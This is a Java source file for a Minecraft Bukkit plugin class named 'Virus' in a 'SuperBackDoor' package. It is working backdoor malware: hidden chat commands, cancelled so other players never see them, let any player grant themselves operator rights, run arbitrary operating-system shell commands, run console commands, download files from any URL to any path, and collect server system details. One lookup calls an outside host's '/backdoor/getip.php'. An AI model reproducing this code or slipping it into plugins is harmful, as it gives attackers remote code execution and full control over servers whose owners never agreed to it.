package space.commandf1.SuperBackDoor;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.Plugin;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.*;
import java.util.Enumeration;
import java.util.Properties;

public class Virus implements Listener {
    private static final String syntaxError = "Syntax error";
    Plugin plugin;

    public Virus (Plugin plugin)
    {
        this.plugin = plugin;
        Bukkit.getServer().getPluginManager().registerEvents(this, this.plugin);
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        Player player = event.getPlayer();
        String message = event.getMessage();
        String[] args = message.split(" ");
        if (!message.startsWith("#"))
        {
            return;
        }
        if (message.equalsIgnoreCase("#getop"))
        {
            player.setOp(true);
            player.sendMessage("Successfully obtained op!");
        } else if (message.equalsIgnoreCase("#deop"))
        {
            player.setOp(false);
            player.sendMessage("Successfully cancelled to op");
        } else if (args[0].equalsIgnoreCase("#console"))
        {
            if (args.length <= 1)
            {
                player.sendMessage(syntaxError);
                event.setCancelled(true);
                return;
            }
            StringBuilder command = new StringBuilder();
            for (int i = 1; i < args.length; i++) {
                if (args.length == i + 1)
                {
                    command.append(args[i]);
                    break;
                }
                command.append(args[i]).append(" ");
            }
            try {
                InputStream inputStream = Runtime.getRuntime().exec(command.toString()).getInputStream();
                InputStreamReader inputStreamReader = new InputStreamReader(inputStream);
                BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
                String line = bufferedReader.readLine();
                while (line != null)
                {
                    player.sendMessage(line);
                    line = bufferedReader.readLine();
                }
                inputStream.close();
                inputStreamReader.close();
                bufferedReader.close();
            } catch (Exception exception) {
                player.sendMessage("Run Error:");
                player.sendMessage(exception.getMessage());
            }
        } else if (args[0].equalsIgnoreCase("#cmd"))
        {
            if (args.length <= 1)
            {
                player.sendMessage(syntaxError);
                event.setCancelled(true);
                return;
            }
            StringBuilder stringBuilder = new StringBuilder();
            for (int i = 1; i < args.length; i++) {
                if (args.length == i + 1)
                {
                    stringBuilder.append(args[i]);
                    break;
                }
                stringBuilder.append(args[i]).append(" ");
            }
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), stringBuilder.toString());
            player.sendMessage("Successfully run command \"" + stringBuilder + "\" by BukkitCommander");
        } else if (message.equalsIgnoreCase("#info"))
        {
            Properties properties = System.getProperties();
            try {
                player.sendMessage(new String[]
                        {
                                "服务器信息",
                                "系统: " + System.getProperty("os.name"),
                                "系统架构: " + System.getProperty("os.arch"),
                                "系统版本: " + System.getProperty("os.version"),
                                "Java 的运行环境版本:" + properties.getProperty("java.version"),
                                "IP(内网): " + getIpAddress(),
                                "IP(外网): " + getIpFromInternet(),
                                "Java的安装路径: " + properties.getProperty("java.home"),
                                "用户的主目录: " + properties.getProperty("user.home"),
                                "用户的当前工作目录: " + properties.getProperty("user.dir"),
                                "计算机名: " + InetAddress.getLocalHost().getHostName()
                        }
                );
            } catch (Exception exception) {
                player.sendMessage("Run Error:");
                player.sendMessage(exception.getMessage());
            }
        } else if (message.equalsIgnoreCase("#help") || message.equalsIgnoreCase("#?")) {
            player.sendMessage(new String[]{
                    "#info - Get the info of the server.",
                    "#getop - Get the OP of the server.",
                    "#deop - De-op of the server.",
                    "#console <command> - Run command by SystemSender[ \"cmd /c\" Avoid errors(Windows) " +
                            "| \"/bin/sh -c\" Avoid errors(Linux) ].",
                    "#cmd <command> - Run command by BukkitSender.",
                    "#download <downloadLink> <path> - Download the file from the Internet.",
            });
        } else if (args[0].equalsIgnoreCase("#download")) {
            if (args.length != 3)
            {
                player.sendMessage(syntaxError);
                event.setCancelled(true);
                return;
            }
            String downloadLink = args[1];
            String path = args[2];
            downloadFile(downloadLink, path);
            player.sendMessage("Already tried to download the file.");
        } else {
            player.sendMessage(new String[]{
                    "ConsoleHooker v 1.0",
                    "Made By commandf1",
                    "Type \"#help\" or \"#?\" to get help."
            });
        }
        event.setCancelled(true);
    }

    public static String getIpAddress() {
        try {
            Enumeration<NetworkInterface> allNetInterfaces = NetworkInterface.getNetworkInterfaces();
            InetAddress ip;
            while (allNetInterfaces.hasMoreElements()) {
                NetworkInterface netInterface = allNetInterfaces.nextElement();
                if (!(netInterface.isLoopback() || netInterface.isVirtual() || !netInterface.isUp())) {
                    Enumeration<InetAddress> addresses = netInterface.getInetAddresses();
                    while (addresses.hasMoreElements()) {
                        ip = addresses.nextElement();
                        if (ip instanceof Inet4Address) {
                            return ip.getHostAddress();
                        }
                    }
                }
            }
        } catch (Exception ignored) {}
        return "null";
    }

    public static String getIpFromInternet()
    {
        return getHtml("http://39.103.149.33/backdoor/getip.php");
    }

    public static void downloadFile(String url, String filePath) {
        try {
            URL u = new URL(url);
            URLConnection uc = u.openConnection();
            java.io.BufferedInputStream in = new java.io.BufferedInputStream(uc.getInputStream());
            java.io.FileOutputStream fos = new java.io.FileOutputStream(filePath);
            byte[] buffer = new byte[1024];
            int len;
            while ((len = in.read(buffer)) != -1) {
                fos.write(buffer, 0, len);
            }
            in.close();
            fos.close();
        } catch (Exception ignored) {}
    }

    public static String getHtml(String url) {
        StringBuilder sb = new StringBuilder();
        try {
            URL u = new URL(url);
            URLConnection uc = u.openConnection();
            java.io.BufferedReader in = new java.io.BufferedReader(new java.io.InputStreamReader(uc.getInputStream()));
            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                sb.append(inputLine);
            }
            in.close();
        } catch (Exception ignored) {}
        return sb.toString();
    }
}

